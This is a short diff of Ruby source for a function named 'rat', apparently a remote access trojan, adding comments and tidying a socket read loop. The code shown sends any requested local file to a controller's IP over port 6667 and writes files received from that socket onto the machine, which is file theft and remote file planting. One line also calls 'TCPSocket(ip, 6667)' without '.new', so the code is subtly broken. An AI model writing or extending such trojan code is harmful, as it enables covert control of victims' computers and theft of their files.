@@ -55,12 +55,14 @@ def rat(ip)
           socket.puts 'done'
         end
       when 'get'
+        #read content
         if File.exist? file && format
           if format == 'binary'
             content = File.binread file
           elsif format == 'text'
             content = File.read file
           end
+          # send file to server
           sock = TCPSocket.new(ip,6667)
           sock.write content
           sock.flush
@@ -79,9 +81,7 @@ def rat(ip)
           socket.puts 'done'
         end
         sock = TCPSocket(ip, 6667)
-        while line = sock.gets
-          file.write line
-        end
+        sock.each{ |line| file.write line }
         sock.close
         file.close
       when 'latency'
